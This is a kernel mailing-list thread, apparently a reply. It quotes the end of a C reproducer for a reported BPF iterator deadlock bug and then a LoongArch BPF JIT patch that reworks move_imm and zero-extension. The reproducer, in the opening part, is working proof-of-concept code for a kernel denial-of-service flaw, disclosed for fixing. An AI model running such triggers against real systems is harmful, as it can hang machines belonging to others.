->> 	*(uint32_t *)(pattr + 0x1c) = sizeof(vlog);		/* log_size            */
->> 	*(uint64_t *)(pattr + 0x20) = (uint64_t)vlog;		/* log_buf             */
->> 	*(uint32_t *)(pattr + 0x2c) = BPF_F_SLEEPABLE;		/* prog_flags          */
->> 	*(uint32_t *)(pattr + 0x44) = BPF_TRACE_ITER;		/* expected_attach_type*/
->> 	*(uint32_t *)(pattr + 0x6c) = BTF_ID_BPF_ITER_TASK_VMA;	/* attach_btf_id       */
->>
->> 	int prog_fd = sys_bpf(BPF_PROG_LOAD, pattr, sizeof(pattr));
->> 	if (prog_fd < 0) { fprintf(stderr, "prog_load: %m\n%.*s\n", (int)sizeof(vlog), vlog); return 1; }
->>
->> 	/* link_create: no iter_info -> BPF_TASK_ITER_ALL; the iterator will
->> 	 * eventually reach our own task (curr_mm == current->mm) */
->> 	uint8_t lattr[0x20] = { 0 };
->> 	*(uint32_t *)(lattr + 0x00) = prog_fd;
->> 	*(uint32_t *)(lattr + 0x04) = 0;			/* target_fd           */
->> 	*(uint32_t *)(lattr + 0x08) = BPF_TRACE_ITER;		/* attach_type         */
->>
->> 	int link_fd = sys_bpf(BPF_LINK_CREATE, lattr, sizeof(lattr));
->> 	if (link_fd < 0) { perror("link_create"); return 1; }
->>
->> 	uint8_t iattr[8] = { 0 };
->> 	*(uint32_t *)(iattr + 0x00) = link_fd;
->> 	int iter_fd = sys_bpf(BPF_ITER_CREATE, iattr, sizeof(iattr));
->> 	if (iter_fd < 0) { perror("iter_create"); return 1; }
->>
->> 	printf("armed: pid=%d iter_fd=%d; starting writer + reader\n", getpid(), iter_fd);
->> 	fflush(stdout);
->>
->> 	pthread_t t;
->> 	pthread_create(&t, NULL, thr_writer, NULL);
->>
->> 	static char buf[8192];
->> 	/* read() runs the prog on our own mm while holding its read lock. */
->> 	ssize_t n = read(iter_fd, buf, sizeof(buf));
->> 	printf("read returned %zd (errno=%d) -- no deadlock\n", n, errno);
->> 	return 0;
->> }
->> ```
->>
->> ## Kernel Configuration Requirements for Reproduction
->>
->> The vulnerability can be triggered with the kernel config in the
->> attachment.
-> 
-
+>  arch/loongarch/net/bpf_jit.c | 102 +++++++++++++++++++----------------
+>  arch/loongarch/net/bpf_jit.h |   7 +--
+>  2 files changed, 58 insertions(+), 51 deletions(-)
+>
+> diff --git a/arch/loongarch/net/bpf_jit.c b/arch/loongarch/net/bpf_jit.c
+> index e78eb582c300..77cd96a6f84c 100644
+> --- a/arch/loongarch/net/bpf_jit.c
+> +++ b/arch/loongarch/net/bpf_jit.c
+> @@ -194,7 +194,7 @@ static void build_prologue(struct jit_ctx *ctx)
+>         ctx->stack_size =3D stack_adjust;
+>
+>         if (ctx->arena_vm_start)
+> -               move_imm(ctx, REG_ARENA, ctx->arena_vm_start, false);
+> +               move_imm(ctx, REG_ARENA, ctx->arena_vm_start);
+>  }
+>
+>  static void __build_epilogue(struct jit_ctx *ctx, bool is_tail_call)
+> @@ -339,7 +339,7 @@ static int emit_bpf_tail_call(struct jit_ctx *ctx, in=
+t insn)
+>
+>  static void emit_store_stack_imm64(struct jit_ctx *ctx, int reg, int sta=
+ck_off, u64 imm64)
+>  {
+> -       move_imm(ctx, reg, imm64, false);
+> +       move_imm(ctx, reg, imm64);
+>         emit_insn(ctx, std, reg, LOONGARCH_GPR_FP, stack_off);
+>  }
+>
+> @@ -355,7 +355,7 @@ static int emit_atomic_rmw(const struct bpf_insn *ins=
+n, struct jit_ctx *ctx)
+>         const s32 imm =3D insn->imm;
+>         const bool isdw =3D BPF_SIZE(insn->code) =3D=3D BPF_DW;
+>
+> -       move_imm(ctx, t1, off, false);
+> +       move_imm(ctx, t1, off);
+>         emit_insn(ctx, addd, t1, dst, t1);
+>         move_reg(ctx, t3, src);
+>
+> @@ -528,7 +528,7 @@ static int emit_atomic_ld_st(const struct bpf_insn *i=
+nsn, struct jit_ctx *ctx)
+>                         if (is_signed_imm12(off)) {
+>                                 emit_insn(ctx, ldbu, dst, src, off);
+>                         } else {
+> -                               move_imm(ctx, t1, off, false);
+> +                               move_imm(ctx, t1, off);
+>                                 emit_insn(ctx, ldxbu, dst, src, t1);
+>                         }
+>                         break;
+> @@ -536,7 +536,7 @@ static int emit_atomic_ld_st(const struct bpf_insn *i=
+nsn, struct jit_ctx *ctx)
+>                         if (is_signed_imm12(off)) {
+>                                 emit_insn(ctx, ldhu, dst, src, off);
+>                         } else {
+> -                               move_imm(ctx, t1, off, false);
+> +                               move_imm(ctx, t1, off);
+>                                 emit_insn(ctx, ldxhu, dst, src, t1);
+>                         }
+>                         break;
+> @@ -544,7 +544,7 @@ static int emit_atomic_ld_st(const struct bpf_insn *i=
+nsn, struct jit_ctx *ctx)
+>                         if (is_signed_imm12(off)) {
+>                                 emit_insn(ctx, ldwu, dst, src, off);
+>                         } else {
+> -                               move_imm(ctx, t1, off, false);
+> +                               move_imm(ctx, t1, off);
+>                                 emit_insn(ctx, ldxwu, dst, src, t1);
+>                         }
+>                         break;
+> @@ -552,7 +552,7 @@ static int emit_atomic_ld_st(const struct bpf_insn *i=
+nsn, struct jit_ctx *ctx)
+>                         if (is_signed_imm12(off)) {
+>                                 emit_insn(ctx, ldd, dst, src, off);
+>                         } else {
+> -                               move_imm(ctx, t1, off, false);
+> +                               move_imm(ctx, t1, off);
+>                                 emit_insn(ctx, ldxd, dst, src, t1);
+>                         }
+>                         break;
+> @@ -567,7 +567,7 @@ static int emit_atomic_ld_st(const struct bpf_insn *i=
+nsn, struct jit_ctx *ctx)
+>                         if (is_signed_imm12(off)) {
+>                                 emit_insn(ctx, stb, src, dst, off);
+>                         } else {
+> -                               move_imm(ctx, t1, off, false);
+> +                               move_imm(ctx, t1, off);
+>                                 emit_insn(ctx, stxb, src, dst, t1);
+>                         }
+>                         break;
+> @@ -575,7 +575,7 @@ static int emit_atomic_ld_st(const struct bpf_insn *i=
+nsn, struct jit_ctx *ctx)
+>                         if (is_signed_imm12(off)) {
+>                                 emit_insn(ctx, sth, src, dst, off);
+>                         } else {
+> -                               move_imm(ctx, t1, off, false);
+> +                               move_imm(ctx, t1, off);
+>                                 emit_insn(ctx, stxh, src, dst, t1);
+>                         }
+>                         break;
+> @@ -583,7 +583,7 @@ static int emit_atomic_ld_st(const struct bpf_insn *i=
+nsn, struct jit_ctx *ctx)
+>                         if (is_signed_imm12(off)) {
+>                                 emit_insn(ctx, stw, src, dst, off);
+>                         } else {
+> -                               move_imm(ctx, t1, off, false);
+> +                               move_imm(ctx, t1, off);
+>                                 emit_insn(ctx, stxw, src, dst, t1);
+>                         }
+>                         break;
+> @@ -591,7 +591,7 @@ static int emit_atomic_ld_st(const struct bpf_insn *i=
+nsn, struct jit_ctx *ctx)
+>                         if (is_signed_imm12(off)) {
+>                                 emit_insn(ctx, std, src, dst, off);
+>                         } else {
+> -                               move_imm(ctx, t1, off, false);
+> +                               move_imm(ctx, t1, off);
+>                                 emit_insn(ctx, stxd, src, dst, t1);
+>                         }
+>                         break;
+> @@ -716,7 +716,7 @@ static int build_insn(const struct bpf_insn *insn, st=
+ruct jit_ctx *ctx, bool ext
+>                 if (insn_is_cast_user(insn)) {
+>                         move_reg(ctx, t1, src);
+>                         emit_zext_32(ctx, t1, true);
+> -                       move_imm(ctx, dst, (ctx->user_vm_start >> 32) << =
+32, false);
+> +                       move_imm(ctx, dst, (ctx->user_vm_start >> 32) << =
+32);
+>                         emit_insn(ctx, beq, t1, LOONGARCH_GPR_ZERO, 2);
+>                         emit_insn(ctx, or, t1, dst, t1);
+>                         move_reg(ctx, dst, t1);
+> @@ -753,7 +753,8 @@ static int build_insn(const struct bpf_insn *insn, st=
+ruct jit_ctx *ctx, bool ext
+>         /* dst =3D imm */
+>         case BPF_ALU | BPF_MOV | BPF_K:
+>         case BPF_ALU64 | BPF_MOV | BPF_K:
+> -               move_imm(ctx, dst, imm, is32);
+> +               move_imm(ctx, dst, imm);
+> +               emit_zext_32(ctx, dst, is32);
+>                 break;
+>
+>         /* dst =3D dst + src */
+> @@ -769,7 +770,8 @@ static int build_insn(const struct bpf_insn *insn, st=
+ruct jit_ctx *ctx, bool ext
+>                 if (is_signed_imm12(imm)) {
+>                         emit_insn(ctx, addid, dst, dst, imm);
+>                 } else {
+> -                       move_imm(ctx, t1, imm, is32);
+> +                       move_imm(ctx, t1, imm);
+> +                       emit_zext_32(ctx, t1, is32);
+>                         emit_insn(ctx, addd, dst, dst, t1);
+>                 }
+>                 emit_zext_32(ctx, dst, is32);
+> @@ -788,7 +790,8 @@ static int build_insn(const struct bpf_insn *insn, st=
+ruct jit_ctx *ctx, bool ext
+>                 if (is_signed_imm12(-imm)) {
+>                         emit_insn(ctx, addid, dst, dst, -imm);
+>                 } else {
+> -                       move_imm(ctx, t1, imm, is32);
+> +                       move_imm(ctx, t1, imm);
+> +                       emit_zext_32(ctx, t1, is32);
+>                         emit_insn(ctx, subd, dst, dst, t1);
+>                 }
+>                 emit_zext_32(ctx, dst, is32);
+> @@ -804,7 +807,8 @@ static int build_insn(const struct bpf_insn *insn, st=
+ruct jit_ctx *ctx, bool ext
+>         /* dst =3D dst * imm */
+>         case BPF_ALU | BPF_MUL | BPF_K:
+>         case BPF_ALU64 | BPF_MUL | BPF_K:
+> -               move_imm(ctx, t1, imm, is32);
+> +               move_imm(ctx, t1, imm);
+> +               emit_zext_32(ctx, t1, is32);
+>                 emit_insn(ctx, muld, dst, dst, t1);
+>                 emit_zext_32(ctx, dst, is32);
+>                 break;
+> @@ -831,12 +835,13 @@ static int build_insn(const struct bpf_insn *insn, =
+struct jit_ctx *ctx, bool ext
+>         case BPF_ALU | BPF_DIV | BPF_K:
+>         case BPF_ALU64 | BPF_DIV | BPF_K:
+>                 if (!off) {
+> -                       move_imm(ctx, t1, imm, is32);
+> +                       move_imm(ctx, t1, imm);
+> +                       emit_zext_32(ctx, t1, is32);
+>                         emit_zext_32(ctx, dst, is32);
+>                         emit_insn(ctx, divdu, dst, dst, t1);
+>                         emit_zext_32(ctx, dst, is32);
+>                 } else {
+> -                       move_imm(ctx, t1, imm, false);
+> +                       move_imm(ctx, t1, imm);
+>                         emit_sext_32(ctx, t1, is32);
+>                         emit_sext_32(ctx, dst, is32);
+>                         emit_insn(ctx, divd, dst, dst, t1);
+> @@ -866,12 +871,13 @@ static int build_insn(const struct bpf_insn *insn, =
+struct jit_ctx *ctx, bool ext
+>         case BPF_ALU | BPF_MOD | BPF_K:
+>         case BPF_ALU64 | BPF_MOD | BPF_K:
+>                 if (!off) {
+> -                       move_imm(ctx, t1, imm, is32);
+> +                       move_imm(ctx, t1, imm);
+> +                       emit_zext_32(ctx, t1, is32);
+>                         emit_zext_32(ctx, dst, is32);
+>                         emit_insn(ctx, moddu, dst, dst, t1);
+>                         emit_zext_32(ctx, dst, is32);
+>                 } else {
+> -                       move_imm(ctx, t1, imm, false);
+> +                       move_imm(ctx, t1, imm);
+>                         emit_sext_32(ctx, t1, is32);
+>                         emit_sext_32(ctx, dst, is32);
+>                         emit_insn(ctx, modd, dst, dst, t1);
+> @@ -899,7 +905,8 @@ static int build_insn(const struct bpf_insn *insn, st=
+ruct jit_ctx *ctx, bool ext
+>                 if (is_unsigned_imm12(imm)) {
+>                         emit_insn(ctx, andi, dst, dst, imm);
+>                 } else {
+> -                       move_imm(ctx, t1, imm, is32);
+> +                       move_imm(ctx, t1, imm);
+> +                       emit_zext_32(ctx, t1, is32);
+>                         emit_insn(ctx, and, dst, dst, t1);
+>                 }
+>                 emit_zext_32(ctx, dst, is32);
+> @@ -918,7 +925,8 @@ static int build_insn(const struct bpf_insn *insn, st=
+ruct jit_ctx *ctx, bool ext
+>                 if (is_unsigned_imm12(imm)) {
+>                         emit_insn(ctx, ori, dst, dst, imm);
+>                 } else {
+> -                       move_imm(ctx, t1, imm, is32);
+> +                       move_imm(ctx, t1, imm);
+> +                       emit_zext_32(ctx, t1, is32);
+>                         emit_insn(ctx, or, dst, dst, t1);
+>                 }
+>                 emit_zext_32(ctx, dst, is32);
+> @@ -937,7 +945,8 @@ static int build_insn(const struct bpf_insn *insn, st=
+ruct jit_ctx *ctx, bool ext
+>                 if (is_unsigned_imm12(imm)) {
+>                         emit_insn(ctx, xori, dst, dst, imm);
+>                 } else {
+> -                       move_imm(ctx, t1, imm, is32);
+> +                       move_imm(ctx, t1, imm);
+> +                       emit_zext_32(ctx, t1, is32);
+>                         emit_insn(ctx, xor, dst, dst, t1);
+>                 }
+>                 emit_zext_32(ctx, dst, is32);
+> @@ -1097,7 +1106,7 @@ static int build_insn(const struct bpf_insn *insn, =
+struct jit_ctx *ctx, bool ext
+>         case BPF_JMP32 | BPF_JSLE | BPF_K:
+>                 jmp_offset =3D bpf2la_offset(i, off, ctx);
+>                 if (imm) {
+> -                       move_imm(ctx, t1, imm, false);
+> +                       move_imm(ctx, t1, imm);
+>                         tm =3D t1;
+>                 } else {
+>                         /* If imm is 0, simply use zero register. */
+> @@ -1129,7 +1138,8 @@ static int build_insn(const struct bpf_insn *insn, =
+struct jit_ctx *ctx, bool ext
+>         case BPF_JMP | BPF_JSET | BPF_K:
+>         case BPF_JMP32 | BPF_JSET | BPF_K:
+>                 jmp_offset =3D bpf2la_offset(i, off, ctx);
+> -               move_imm(ctx, t1, imm, is32);
+> +               move_imm(ctx, t1, imm);
+> +               emit_zext_32(ctx, t1, is32);
+>                 emit_insn(ctx, and, t1, dst, t1);
+>                 emit_zext_32(ctx, t1, is32);
+>                 if (emit_cond_jmp(ctx, cond, t1, LOONGARCH_GPR_ZERO, jmp_=
+offset) < 0)
+> @@ -1227,7 +1237,7 @@ static int build_insn(const struct bpf_insn *insn, =
+struct jit_ctx *ctx, bool ext
+>                 if (bpf_pseudo_func(insn))
+>                         move_addr(ctx, dst, imm64);
+>                 else
+> -                       move_imm(ctx, dst, imm64, is32);
+> +                       move_imm(ctx, dst, imm64);
+>                 return 1;
+>         }
+>
+> @@ -1268,7 +1278,7 @@ static int build_insn(const struct bpf_insn *insn, =
+struct jit_ctx *ctx, bool ext
+>                                 else
+>                                         emit_insn(ctx, ldbu, dst, src, of=
+f);
+>                         } else {
+> -                               move_imm(ctx, t1, off, is32);
+> +                               move_imm(ctx, t1, off);
+>                                 if (sign_extend)
+>                                         emit_insn(ctx, ldxb, dst, src, t1=
+);
+>                                 else
+> @@ -1282,7 +1292,7 @@ static int build_insn(const struct bpf_insn *insn, =
+struct jit_ctx *ctx, bool ext
+>                                 else
+>                                         emit_insn(ctx, ldhu, dst, src, of=
+f);
+>                         } else {
+> -                               move_imm(ctx, t1, off, is32);
+> +                               move_imm(ctx, t1, off);
+>                                 if (sign_extend)
+>                                         emit_insn(ctx, ldxh, dst, src, t1=
+);
+>                                 else
+> @@ -1296,7 +1306,7 @@ static int build_insn(const struct bpf_insn *insn, =
+struct jit_ctx *ctx, bool ext
+>                                 else
+>                                         emit_insn(ctx, ldwu, dst, src, of=
+f);
+>                         } else {
+> -                               move_imm(ctx, t1, off, is32);
+> +                               move_imm(ctx, t1, off);
+>                                 if (sign_extend)
+>                                         emit_insn(ctx, ldxw, dst, src, t1=
+);
+>                                 else
+> @@ -1304,7 +1314,7 @@ static int build_insn(const struct bpf_insn *insn, =
+struct jit_ctx *ctx, bool ext
+>                         }
+>                         break;
+>                 case BPF_DW:
+> -                       move_imm(ctx, t1, off, is32);
+> +                       move_imm(ctx, t1, off);
+>                         emit_insn(ctx, ldxd, dst, src, t1);
+>                         break;
+>                 }
+> @@ -1331,42 +1341,42 @@ static int build_insn(const struct bpf_insn *insn=
+, struct jit_ctx *ctx, bool ext
+>
+>                 switch (BPF_SIZE(code)) {
+>                 case BPF_B:
+> -                       move_imm(ctx, t1, imm, is32);
+> +                       move_imm(ctx, t1, imm);
+>                         if (is_signed_imm12(off)) {
+>                                 emit_insn(ctx, stb, t1, dst, off);
+>                         } else {
+> -                               move_imm(ctx, t2, off, is32);
+> +                               move_imm(ctx, t2, off);
+>                                 emit_insn(ctx, stxb, t1, dst, t2);
+>                         }
+>                         break;
+>                 case BPF_H:
+> -                       move_imm(ctx, t1, imm, is32);
+> +                       move_imm(ctx, t1, imm);
+>                         if (is_signed_imm12(off)) {
+>                                 emit_insn(ctx, sth, t1, dst, off);
+>                         } else {
+> -                               move_imm(ctx, t2, off, is32);
+> +                               move_imm(ctx, t2, off);
+>                                 emit_insn(ctx, stxh, t1, dst, t2);
+>                         }
+>                         break;
+>                 case BPF_W:
+> -                       move_imm(ctx, t1, imm, is32);
+> +                       move_imm(ctx, t1, imm);
+>                         if (is_signed_imm12(off)) {
+>                                 emit_insn(ctx, stw, t1, dst, off);
+>                         } else if (is_signed_imm14(off)) {
+>                                 emit_insn(ctx, stptrw, t1, dst, off);
+>                         } else {
+> -                               move_imm(ctx, t2, off, is32);
+> +                               move_imm(ctx, t2, off);
+>                                 emit_insn(ctx, stxw, t1, dst, t2);
+>                         }
+>                         break;
+>                 case BPF_DW:
+> -                       move_imm(ctx, t1, imm, is32);
+> +                       move_imm(ctx, t1, imm);
+>                         if (is_signed_imm12(off)) {
+>                                 emit_insn(ctx, std, t1, dst, off);
+>                         } else if (is_signed_imm14(off)) {
+>                                 emit_insn(ctx, stptrd, t1, dst, off);
+>                         } else {
+> -                               move_imm(ctx, t2, off, is32);
+> +                               move_imm(ctx, t2, off);
+>                                 emit_insn(ctx, stxd, t1, dst, t2);
+>                         }
+>                         break;
+> @@ -1397,7 +1407,7 @@ static int build_insn(const struct bpf_insn *insn, =
+struct jit_ctx *ctx, bool ext
+>                         if (is_signed_imm12(off)) {
+>                                 emit_insn(ctx, stb, src, dst, off);
+>                         } else {
+> -                               move_imm(ctx, t1, off, is32);
+> +                               move_imm(ctx, t1, off);
+>                                 emit_insn(ctx, stxb, src, dst, t1);
+>                         }
+>                         break;
+> @@ -1405,7 +1415,7 @@ static int build_insn(const struct bpf_insn *insn, =
+struct jit_ctx *ctx, bool ext
+>                         if (is_signed_imm12(off)) {
+>                                 emit_insn(ctx, sth, src, dst, off);
+>                         } else {
+> -                               move_imm(ctx, t1, off, is32);
+> +                               move_imm(ctx, t1, off);
+>                                 emit_insn(ctx, stxh, src, dst, t1);
+>                         }
+>                         break;
+> @@ -1415,7 +1425,7 @@ static int build_insn(const struct bpf_insn *insn, =
+struct jit_ctx *ctx, bool ext
+>                         } else if (is_signed_imm14(off)) {
+>                                 emit_insn(ctx, stptrw, src, dst, off);
+>                         } else {
+> -                               move_imm(ctx, t1, off, is32);
+> +                               move_imm(ctx, t1, off);
+>                                 emit_insn(ctx, stxw, src, dst, t1);
+>                         }
+>                         break;
+> @@ -1425,7 +1435,7 @@ static int build_insn(const struct bpf_insn *insn, =
+struct jit_ctx *ctx, bool ext
+>                         } else if (is_signed_imm14(off)) {
+>                                 emit_insn(ctx, stptrd, src, dst, off);
+>                         } else {
+> -                               move_imm(ctx, t1, off, is32);
+> +                               move_imm(ctx, t1, off);
+>                                 emit_insn(ctx, stxd, src, dst, t1);
+>                         }
+>                         break;
+> @@ -1537,7 +1547,7 @@ static int emit_jump_and_link(struct jit_ctx *ctx, =
+u8 rd, u64 target)
+>                 return -EFAULT;
+>         }
+>
+> -       move_imm(ctx, LOONGARCH_GPR_T1, target, false);
+> +       move_imm(ctx, LOONGARCH_GPR_T1, target);
+>         emit_insn(ctx, jirl, rd, LOONGARCH_GPR_T1, 0);
+>
+>         return 0;
+> @@ -1734,7 +1744,7 @@ static int invoke_bpf_prog(struct jit_ctx *ctx, str=
+uct bpf_tramp_image *im,
+>                 emit_insn(ctx, std, LOONGARCH_GPR_ZERO, LOONGARCH_GPR_FP,=
+ -run_ctx_off + cookie_off);
+>
+>         /* arg1: prog */
+> -       move_imm(ctx, LOONGARCH_GPR_A0, (const s64)p, false);
+> +       move_imm(ctx, LOONGARCH_GPR_A0, (const s64)p);
+>         /* arg2: &run_ctx */
+>         emit_insn(ctx, addid, LOONGARCH_GPR_A1, LOONGARCH_GPR_FP, -run_ct=
+x_off);
+>         ret =3D emit_call(ctx, (const u64)bpf_trampoline_enter(p));
+> @@ -1755,7 +1765,7 @@ static int invoke_bpf_prog(struct jit_ctx *ctx, str=
+uct bpf_tramp_image *im,
+>         /* arg1: &args_off */
+>         emit_insn(ctx, addid, LOONGARCH_GPR_A0, LOONGARCH_GPR_FP, -args_o=
+ff);
+>         if (!p->jited)
+> -               move_imm(ctx, LOONGARCH_GPR_A1, (const s64)p->insnsi, fal=
+se);
+> +               move_imm(ctx, LOONGARCH_GPR_A1, (const s64)p->insnsi);
+>         ret =3D emit_call(ctx, (const u64)p->bpf_func);
+>         if (ret)
+>                 return ret;
+> @@ -1772,7 +1782,7 @@ static int invoke_bpf_prog(struct jit_ctx *ctx, str=
+uct bpf_tramp_image *im,
+>         }
+>
+>         /* arg1: prog */
+> -       move_imm(ctx, LOONGARCH_GPR_A0, (const s64)p, false);
+> +       move_imm(ctx, LOONGARCH_GPR_A0, (const s64)p);
+>         /* arg2: prog start time */
+>         move_reg(ctx, LOONGARCH_GPR_A1, LOONGARCH_GPR_S1);
+>         /* arg3: &run_ctx */
+> diff --git a/arch/loongarch/net/bpf_jit.h b/arch/loongarch/net/bpf_jit.h
+> index bb58c42c2f2a..57a98f8a055b 100644
+> --- a/arch/loongarch/net/bpf_jit.h
+> +++ b/arch/loongarch/net/bpf_jit.h
+> @@ -137,7 +137,7 @@ static inline void move_addr(struct jit_ctx *ctx, enu=
+m loongarch_gpr rd, u64 add
+>         emit_insn(ctx, lu52id, rd, rd, imm_63_52);
+>  }
+>
+> -static inline void move_imm(struct jit_ctx *ctx, enum loongarch_gpr rd, =
+long imm, bool is32)
+> +static inline void move_imm(struct jit_ctx *ctx, enum loongarch_gpr rd, =
+long imm)
+>  {
+>         long imm_11_0, imm_31_12, imm_51_32, imm_63_52, imm_51_0, imm_51_=
+31;
+>
+> @@ -150,7 +150,7 @@ static inline void move_imm(struct jit_ctx *ctx, enum=
+ loongarch_gpr rd, long imm
+>         /* addiw rd, $zero, imm_11_0 */
+>         if (is_signed_imm12(imm)) {
+>                 emit_insn(ctx, addiw, rd, LOONGARCH_GPR_ZERO, imm);
+> -               goto zext;
+> +               return;
+>         }
+>
+>         /* ori rd, $zero, imm_11_0 */
+> @@ -195,9 +195,6 @@ static inline void move_imm(struct jit_ctx *ctx, enum=
+ loongarch_gpr rd, long imm
+>                 if (!is_signed_imm52(imm))
+>                         emit_insn(ctx, lu52id, rd, rd, imm_63_52);
+>         }
+> -
+> -zext:
+> -       emit_zext_32(ctx, rd, is32);
+>  }
+>
+>  static inline void move_reg(struct jit_ctx *ctx, enum loongarch_gpr rd,
+> --
+> 2.42.0
+>
